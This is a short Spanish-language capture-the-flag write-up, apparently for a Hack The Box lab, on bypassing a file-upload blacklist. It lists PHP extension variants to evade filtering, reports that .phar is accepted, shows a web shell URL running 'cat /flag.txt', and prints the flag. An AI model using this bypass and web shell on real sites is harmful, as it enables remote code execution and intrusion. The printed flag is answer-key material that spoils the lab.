# Laboratorio: Upload Exploitation 📃

1. Visitamos la página web

<p align="center">
    <img src="./assets/Validations/01-Web.PNG" width=400>
</p>

---

2. Primero, eliminamos las validaciones en el `Lado Del Cliente`

```
onchange="checkFile(this)"
accept=".jpg,.jpeg,.png"
```

---

3. Interceptamos la petición con **Burp Suite**

<p align="center">
    <img src="./assets/BlackList/01-Burpsuite.PNG" width=400>
</p>

* Ahora intentaremos subir el archivo con otras extensiones válidas para **archivos .php** hasta encontrar una que no se encuentre en la `BlackList`

* Extensiones:
`.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module`

---

4. La extensión válida es **`.phar`**

--

5. Podemos ejecutar comandos, y así leer la **flag** 🏴
* **URL:** `http://[IP]/profile_images/cmd.phar?cmd=cat%20/flag.txt`

**Output**
`HTB{1_c4n_n3v3r_b3_bl4ckl1573d}`